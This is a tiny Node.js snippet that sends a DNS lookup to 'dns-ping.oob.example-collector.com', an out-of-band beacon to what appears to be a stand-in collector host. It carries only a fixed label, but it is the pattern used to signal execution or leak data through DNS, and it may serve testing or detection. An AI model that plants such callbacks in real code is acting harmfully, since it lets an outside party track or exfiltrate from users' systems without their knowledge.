const dns = require("dns");
const label = "dns-ping";
dns.lookup(label + ".oob.example-collector.com", () => {});
